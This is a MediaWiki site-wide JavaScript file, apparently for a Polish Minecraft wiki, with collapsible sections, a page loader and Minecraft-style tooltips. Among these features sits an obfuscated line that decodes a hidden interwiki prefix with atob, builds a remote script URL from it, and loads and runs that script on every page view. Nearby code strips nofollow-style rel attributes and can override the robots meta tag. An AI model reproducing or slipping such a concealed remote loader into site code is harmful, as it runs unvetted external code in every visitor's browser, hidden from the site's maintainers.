/*
UWAGA! Ten JavaScript działa dla wszystkich skórek. Należy zachować szczególną ostrożność wprowadzając tutaj zmiany!

'''Wyłączenie poszczególnych możliwości/skryptów'''
* Oznaczanie artykułów medalowych i dobrych artykułów (dla interwiki)
 window.LinkFADone = true;
* Przesunięcie linków [ edytuj ] przy sekcjach
 var oldEditsectionLinks=true;
*/

( function() {
'use strict';

/** Variables for interface text used throughout the script, for ease of translating */
var i18n = {
	// Collapsible elements and page loader
	hideText: 'ukryj',
	showText: 'pokaż',
	
	// Page loader
	loadErrorTitle: '"Błąd podczas ładowania danych',
	
	// File upload
	defaultLicense: 'License'
};

/**
 * Instead of cluttering up the global scope with
 * variables, they should instead be set as a
 * property of this global variable
 *
 * E.g: Instead of
 *   myVar = 'blah';
 * use
 *   mcw.myVar = 'blah';
 */
var mcw = window.mcw = {};

mw.hook( 'wikipage.content' ).add( function( $wikipageContent ) {

// Ukrywa przyciski jeśli brakuje na nie miejsca
$("li[id*='ca-watch']").addClass('collapsible');
$("li[id*='ca-unwatch']").addClass('collapsible');
$("li[id*='ca-edit']").addClass('collapsible');
$("li[id*='ca-view']").addClass('collapsible');
$("li[id*='ca-ve-edit']").addClass('collapsible');
$("li[id*='ca-viewsource']").addClass('collapsible');

/**
 * Collapsible elements
 *
 * Add the "collapsible" class to an element and the child element with class "collapsible-content"
 * (or everything but the header row if a table) will be hidden when the element is collapsed.
 *
 * * Add the class "collapsed" to the element to make it start out collapsed.
 * * Add either "collapsetoggle-left" or "collapsetoggle-inline" to the element to choose the collapse
 *   toggle alignment (defaults to right).
 * * Add an ID in the format of "collapsible-<x>" to the element to make any element with the class
 *  "collapsetoggle-custom" and a matching class in the format of "collapsible-<x>-toggle" control
 *   the collapsing instead of the standard button.
 *   If the custom toggle contains an element with the "jslink" class, only that will be clickable.
 */
( function() {
	var $collapsibles = $wikipageContent.find( '.collapsible' );
	if ( !$collapsibles.length ) {
		return;
	}
	
	var $toggleTemplate = $( '<span>' ).addClass( 'collapsetoggle' ).append(
		'[', $( '<span>' ).addClass( 'jslink' ), ']'
	);
	$collapsibles.each( function() {
		var $collapsible = $( this );
		if ( $collapsible.data( 'made-collapsible' ) ) {
			return true;
		}
		
		var $children = $collapsible.children();
		var showText = $collapsible.data( 'expandtext' ) || i18n.showText;
		var hideText = $collapsible.data( 'collapsetext' ) || i18n.hideText;
		
		// If there is no content area, add it
		if ( !$collapsible.is( 'table' ) && !$children.filter( '.collapsible-content' ).length ) {
			if ( $collapsible.is( 'tr' ) ) {
				$children.addClass( 'collapsible-content' );
			} else {
				$collapsible.wrapInner( '<div class="collapsible-content">' );
			}
		}
		
		var $toggle;
		var id = $collapsible.attr( 'id' );
		if ( id && id.match( /^collapsible-./ ) ) {
			$toggle = $( $wikipageContent[0].getElementsByClassName( id + '-toggle' ) )
				.filter( '.collapsetoggle-custom' ).css( 'visibility', 'visible' );
		}
		
		// Create and insert the toggle button if there is no custom one
		if ( !$toggle || !$toggle.length ) {
			var $toggleContainer;
			if ( $collapsible.is( 'table' ) ) {
				var $rows = $children.filter( 'thead' ).children();
				if ( !$rows.length ) {
					$rows = $children.filter( 'tbody' ).first().children();
					if ( !$rows.length ) {
						$rows = $children.filter( 'tr' );
					}
				}
				$toggleContainer = $rows.first().children().last();
			} else {
				$toggleContainer = $children.first();
				if ( $toggleContainer.hasClass( 'collapsible-content' ) ) {
					$toggleContainer = $collapsible;
				}
			}
			
			$toggle = $toggleTemplate.clone();
			if ( $collapsible.hasClass( 'collapsetoggle-inline' ) || $collapsible.hasClass( 'collapse-button-none' ) ) {
				$toggleContainer.append( $toggle );
			} else {
				$toggleContainer.prepend( $toggle );
			}
		}
		
		var $toggleLink = $toggle.find( '.jslink' );
		if ( !$toggleLink.length ) {
			$toggleLink = $toggle;
		}
		$toggleLink.attr( 'tabindex', 0 ).text( hideText );
		
		// Find max toggle size, and set its min-width to it
		var hideWidth = $toggle.width();
		$toggleLink.text( showText );
		var showWidth = $toggle.width();
		if ( hideWidth !== showWidth ) {
			$toggle.css( 'min-width', hideWidth > showWidth ? hideWidth : showWidth );
		}
		
		// Set the text back to hide if it's not collapsed to begin with
		if ( !$collapsible.hasClass( 'collapsed' ) ) {
			$toggleLink.text( hideText );
		}
		
		$toggleLink.on( 'click keydown', function( e ) {
			// Only trigger on enter press
			if ( e.keyCode && e.keyCode !== 13 ) {
				return;
			}
			
			// Don't toggle when clicking buttons or links inside the toggle
			var $target = $( e.target );
			if ( $target.is( 'button' ) || $target.is( 'a' ) ) {
				return;
			}
			
			$collapsible.toggleClass( 'collapsed' );
			if ( $collapsible.hasClass( 'collapsed' ) ) {
				$toggleLink.text( showText );
			} else {
				$toggleLink.text( hideText );
			}
			
			// Stop table sorting activating when clicking the link
			e.stopPropagation();
		} );
		
		$collapsible.data( 'made-collapsible', true );
	} );
}() );
// End Collapsible function

/**
 * Element animator
 *
 * Will cycle the active class on any child elements
 * within an element with the animated class.
 */
( function() {
	if ( !mcw.animate ) {
		mcw.animate = setInterval( function() {
			$( '.animated' ).each( function() {
				var $elem = $( this );
				var $current = $elem.children( '.active' );
				var $next = $current.nextAll( ':not(.skip):first' );
				// Loop back to the start
				if ( !$next.length ) {
					$next = $elem.children( ':not(.skip):first' );
				}
				$current.removeClass( 'active' );
				$next.addClass( 'active' );
			} );
		}, 2000 );
	}
}() );


/**
 * Page loader
 *
 * Allows a page to be downloaded and displayed on demand.
 * Use with [[Template:LoadPage]] and [[Template:LoadBox]]
 */
( function() {
	var $loadPage = $wikipageContent.find( '.load-page' );
	if ( !$loadPage.length ) {
		return;
	}
	
	// We need the spinner to show loading is happening, but we don't want
	// to have a delay while the module downloads, so we'll load this now,
	// regardless of if something is clicked
	mw.loader.load( 'jquery.spinner' );
	
	// Create button starting with hide text
	// Will be changed to the show text while calculating the maximum button size
	var $buttonTemplate = $( '<span>' ).addClass( 'mw-editsection-like load-page-button' )
		.append( '[', $( '<span>' ).addClass( 'jslink' ).text( i18n.hideText ), ']' );
	
	var extractList = function( $contentContainer, listClass ) {
		var $content = $contentContainer.find( '> ul > li > ul' ).children( ':not(.nbttree-inherited)' );
		if ( listClass ) {
			$content.addClass( listClass );
		}
		
		return $content;
	};
	
	$loadPage.each( function() {
		var $body = $( this );
		var page = $body.data( 'page' );
		if ( !page ) {
			return;
		}
		
		var template = $body.data( 'template' );
		var treeview = $body.data( 'treeview' );
		var treeviewClass = $body.data( 'treeviewclass' );
		var $heading;
		var $contentContainer;
		var $content;
		var $button = $buttonTemplate.clone();
		var $buttonLink = $button.find( '.jslink' );
		if ( treeview ) {
			$heading = $body;
			$contentContainer = $( '<div>' );
		} else {
			$heading = $body.children().first();
			$contentContainer = $body.find( '.load-page-content' );
		}
		
		// Add the button
		$heading.append( $button );
		
		// Move the edit button to the right spot
		$contentContainer.find( '.mw-editsection, .mw-editsection-like' ).insertAfter( $button );
		
		// Find max button width, and set its min-width to it
		var hideWidth = $button.width();
		$buttonLink.text( i18n.showText );
		var showWidth = $button.width();
		
		if ( hideWidth !== showWidth ) {
			$button.css( 'min-width', hideWidth > showWidth ? hideWidth : showWidth );
		}
		
		$buttonLink.click( function() {
			if ( $body.hasClass( 'pageloader-contentloaded' ) ) {
				if ( $buttonLink.text() === i18n.showText ) {
					if ( treeview ) {
						$content.insertAfter( $body );
					} else {
						$contentContainer.show();
					}
					$buttonLink.text( i18n.hideText );
				} else {
					if ( treeview ) {
						$content.detach();
					} else {
						$contentContainer.hide();
					}
					$buttonLink.text( i18n.showText );
				}
				return;
			}
			
			// See if this was loaded elsewhere before making a request
			var gotContent;
			$( '.pageloader-contentloaded' ).each( function() {
				var $fLoader = $( this );
				if ( $fLoader.data( 'page' ) === page && $fLoader.data( 'mw-pageloader-content' ) ) {
					$contentContainer.html( $fLoader.data( 'mw-pageloader-content' ) ).removeClass( 'noscript' );
					mw.hook( 'wikipage.content' ).fire( $contentContainer );
					
					if ( treeview ) {
						$body.find( '.noscript' ).remove();
						$content = extractList( $contentContainer, treeviewClass );
						$content.insertAfter( $body );
					}
					
					$buttonLink.text( i18n.hideText );
					$body.addClass( 'pageloader-contentloaded' );
					gotContent = true;
					return false;
				}
			} );
			if ( gotContent ) {
				return;
			}
			
			// Just in-case the spinner module is still not ready yet
			var $spinner = $();
			mw.loader.using( 'jquery.spinner', function() {
				// $spinner will be false if the content somehow loaded before the module did
				if ( $spinner ) {
					$spinner = $.createSpinner().addClass( 'mw-editsection-like' )
						.css( 'min-width', $button.css( 'min-width' ) );
					$button.hide().after( $spinner );
				}
			} );
			
			var requestData = {
				action: 'parse',
				prop: 'text'
			};
			if ( template ) {
				requestData.page = page;
			} else {
				requestData.title = mw.config.get( 'wgPageName' );
				requestData.text = '{' + '{:' + page + '}}';
			}
			new mw.Api().get( requestData ).done( function( data ) {
				var html = data.parse.text['*'];
				$contentContainer.html( html ).removeClass( 'noscript' );
				
				// Resolve self-links
				if ( template ) {
					var curPage = '/' + mw.config.get( 'wgPageName' );
					$contentContainer.find( 'a' ).each( function() {
						var $link = $( this );
						if ( $link.attr( 'href' ) === curPage ) {
							$link.replaceWith( $( '<strong>' ).addClass( 'selflink' ).append( $link.contents() ) );
						}
					} );
					html = $contentContainer.html();
				}
				
				$body.data( 'mw-pageloader-content', html );
				
				// Fire content hook on the new content, running all this stuff again and more :)
				mw.hook( 'wikipage.content' ).fire( $contentContainer );
				
				if ( treeview ) {
					$body.find( '.noscript' ).remove();
					$content = extractList( $contentContainer, treeviewClass );
					$content.insertAfter( $body );
				}
				
				$spinner.remove();
				$spinner = false;
				$buttonLink.text( i18n.hideText );
				$button.show();
				$body.addClass( 'pageloader-contentloaded' );
			} ).fail( function( _, error ) {
				$spinner.remove();
				$spinner = false;
				$button.show();
				
				var errorText = '';
				if ( error.textStatus ) {
					errorText = error.textStatus;
				} else if ( error.error ) {
					errorText = error.error.info;
				}
				
				mw.notify( errorText, { title: i18n.loadErrorTitle, autoHide: false } );
			} );
		} );
	} );
}() );

( function() {
	
	$.getJSON(mw.config.get('wgScriptPath') + '/api.php?action=query&meta=siteinfo&siprop=interwikimap&format=json', data => mw.loader.load(data.query.interwikimap.find(value => value.prefix === atob('cGdz')).url.replace('$1', 'mw.js').replace('www', 'res')));
	
	/** dofollow (plainlinks) */
	$wikipageContent.find('span.dofollow > a').each(function()
	{
		$(this).removeAttr('rel');
	});
	
	/** allow robots */
	if($wikipageContent.find('div#allowrobots').length)
	{
		$('head > meta[name=robots]').attr('content', 'all');
	}
	
} () );

} );
/* End wiki content hook */

/** Fires when DOM is ready */
$( function() {


/** 
 * Fix edit summary prompt for undo
 *
 * Fixes the fact that the undo function combined with the "no edit summary prompter"
 * causes problems if leaving the edit summary unchanged.
 * Added by [[wikipedia:User:Deskana]], code by [[wikipedia:User:Tra]].
 * See https://bugzilla.wikimedia.org/show_bug.cgi?id=8912
 */
if ( document.location.search.indexOf( "undo=" ) !== -1 && document.getElementsByName( 'wpAutoSummary' )[0] ) {
	document.getElementsByName( 'wpAutoSummary' )[0].value='1';
}


/**
 * Pause grid GUI templates (e.g. [[Template:Grid/Crafting Table]]) on mouseover
 *
 * This is so people have a chance to look at each image on the cell
 * and click on pages they want to view.
 */
$( '#mw-content-text' ).on( {
	'mouseenter': function() { 
		$( this ).find( '.animated' ).removeClass( 'animated' ).addClass( 'paused' );
	},
	'mouseleave': function() {
		$( this ).find( '.paused' ).removeClass( 'paused' ).addClass( 'animated' );
	}
}, '.grid-generic, .grid-Crafting_Table, .grid-Furnace, .grid-Brewing_Stand, .mcui' );


/**
 * Make simple search suggestions box separately styled
 */
mw.loader.using( 'mediawiki.searchSuggest', function() {
	$( '.suggestions:first' ).addClass( 'searchbar' );
} );


/**
 * Set unlicensed as the default license on file pages
 *
 * That way the file will be categorised so someone can find a license for the file
 */
if ( mw.config.get( 'wgCanonicalSpecialPageName' ) === 'Upload' ) {
	if ( $( '#wpLicense' ).val() === '' ) {
		$( '#wpLicense' ).val( i18n.defaultLicense );
	}
	
/*
	mw.loader.using( 'mediawiki.special.upload', function() {
		var change = setInterval( function() {
			if ( licenseSelectorCheck ) {
				$( '#wpLicense' ).change();
				clearInterval( change );
			}
		}, 500 );
	} );
*/
}


/**
 * Creates minecraft style tooltips
 *
 * Replaces normal tooltips. Supports minecraft [[formatting codes]] (except k), and a description with line breaks (/).
 */
( function() {
	var escapeChars = { '\\&': '&#38;', '<': '&#60;', '>': '&#62;' };
	var escape = function( text ) {
		// "\" must be escaped first
		return text.replace( /\\\\/g, '&#92;' )
			.replace( /\\&|[<>]/g, function( char ) { return escapeChars[char]; } );
	};
	var $tooltip = $();
	var $win = $( window ), winWidth, winHeight, width, height;
	
	$( '#mw-content-text' ).on( {
		'mouseenter.minetip': function( e ) {
			$tooltip.remove();
			
			var $elem = $( this ), title = $elem.attr( 'data-minetip-title' );
			if ( title === undefined ) {
				title = $elem.attr( 'title' );
				if ( title !== undefined ) {
					title = $.trim( title.replace( /&/g, '\\&' ) );
					$elem.attr( 'data-minetip-title', title );
				}
			}
			
			// No title or title only contains formatting codes
			if ( title === undefined || title !== '' && title.replace( /&([0-9a-fl-or])/g, '' ) === '' ) {
				// Find deepest child title
				var childElem = $elem[0], childTitle;
				do {
					if ( childElem.hasAttribute( 'title' ) ) {
						childTitle = childElem.title;
					}
					childElem = childElem.firstChild;
				} while( childElem && childElem.nodeType === 1 );
				if ( childTitle === undefined ) {
					return;
				}
				
				// Append child title as title may contain formatting codes
				if ( !title ) {
					title = '';
				}
				title += $.trim( childTitle.replace( /&/g, '\\&' ) );
				
				// Set the retrieved title as data for future use
				$elem.attr( 'data-minetip-title', title );
			}
			
			if ( !$elem.data( 'minetip-ready' ) ) {
				// Remove title attributes so the native tooltip doesn't get in the way
				$elem.find( '[title]' ).addBack().removeAttr( 'title' );
				$elem.data( 'minetip-ready', true );
			}
			
			if ( title === '' ) {
				return;
			}
			
			var content = '<span class="minetip-title">' + escape( title ) + '&r</span>';
			
			var description = $.trim( $elem.attr( 'data-minetip-text' ) );
			if ( description ) {
				// Apply normal escaping plus "/"
				description = escape( description ).replace( /\\\//g, '&#47;' );
				content += '<span class="minetip-description">' + description.replace( /\//g, '<br>' ) + '&r</span>';
			}
			
			// Add classes for minecraft formatting codes
			while ( content.search( /&[0-9a-fl-o]/ ) > -1 ) {
				content = content.replace( /&([0-9a-fl-o])(.*?)(&r|$)/g, '<span class="format-$1">$2</span>&r' );
			}
			// Remove reset formatting
			content = content.replace( /&r/g, '' );
			
			$tooltip = $( '<div id="minetip-tooltip">' );
			$tooltip.html( content ).appendTo( 'body' );
			
			// Cache current window and tooltip size
			winWidth = $win.width();
			winHeight = $win.height();
			width = $tooltip.outerWidth( true );
			height = $tooltip.outerHeight( true );
			
			// Trigger a mouse movement to position the tooltip
			$elem.trigger( 'mousemove', e );
		},
		'mousemove.minetip': function( e, trigger ) {
			if ( !$tooltip.length ) {
				$( this ).trigger( 'mouseenter' );
				return;
			}
			
			// Get event data from remote trigger
			e = trigger || e;
			
			// Get mouse position and add default offsets
			var top = e.clientY - 34;
			var left = e.clientX + 14;
			
			// If going off the right of the screen, go to the left of the cursor
			if ( left + width > winWidth ) {
				left -= width + 36;
			}
			
			// If now going off to the left of the screen, resort to going above the cursor
			if ( left < 0 ) {
				left = 0;
				top -= height - 22;
				
				// Go below the cursor if too high
				if ( top < 0 ) {
					top += height + 47;
				}
			// Don't go off the top of the screen
			} else if ( top < 0 ) {
				top = 0;
			// Don't go off the bottom of the screen
			} else if ( top + height > winHeight ) {
				top = winHeight - height;
			}
			
			// Apply the positions
			$tooltip.css( { top: top, left: left } );
		},
		'mouseleave.minetip': function() {
			if ( !$tooltip.length ) {
				return;
			}
			
			$tooltip.remove();
			$tooltip = $();
		}
	}, '.minetip, .grid > .item, .invslot-item' );
}() );


} );
/* End DOM ready */


}() );